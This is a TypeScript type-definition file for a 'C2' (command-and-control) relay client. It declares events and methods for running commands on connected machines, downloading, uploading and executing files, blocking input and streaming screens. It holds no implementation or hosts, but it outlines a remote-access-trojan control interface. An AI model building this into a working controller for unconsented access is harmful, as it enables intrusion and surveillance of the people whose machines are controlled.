export interface C2Machine {
  id:           string;
  name:         string;
  os:           string;
  ip:           string;
  connected_at: string;
}

export interface C2FileEntry {
  name: string;
  dir:  boolean;
  size: number;
}

export type C2Event =
  | { type: "welcome";              machines: C2Machine[] }
  | { type: "machines";             list: C2Machine[] }
  | { type: "machine_connected";    machine: C2Machine }
  | { type: "machine_disconnected"; machine_id: string }
  | { type: "cmd_result";           machine_id: string; output: string }
  | { type: "file_list_result";     machine_id: string; path: string; entries: C2FileEntry[] }
  | { type: "file_data";            machine_id: string; path: string; data?: string; size?: number; error?: string }
  | { type: "file_upload_result";   machine_id: string; ok: boolean; path?: string; error?: string }
  | { type: "file_exec_result";     machine_id: string; ok: boolean; path?: string; output?: string; error?: string }
  | { type: "input_status";         machine_id: string; blocked: boolean }
  | { type: "screen_frame";         machine_id: string; data: string }
  | { type: "error";                error: string };

export interface IC2RelayClient {
  connect(serverUrl: string, token?: string): Promise<void>;
  disconnect(): void;
  isConnected(): boolean;
  onEvent(listener: (event: C2Event) => void): () => void;

  listMachines(): void;
  sendCommand(machineId: string, command: string): void;
  fileList(machineId: string, path: string): void;
  fileDownload(machineId: string, path: string): void;
  fileUpload(machineId: string, path: string, data: string): void;
  fileExec(machineId: string, path: string): void;
  blockInput(machineId: string): void;
  unblockInput(machineId: string): void;
  screenStart(machineId: string, fps?: number): void;
  screenStop(machineId: string): void;
}

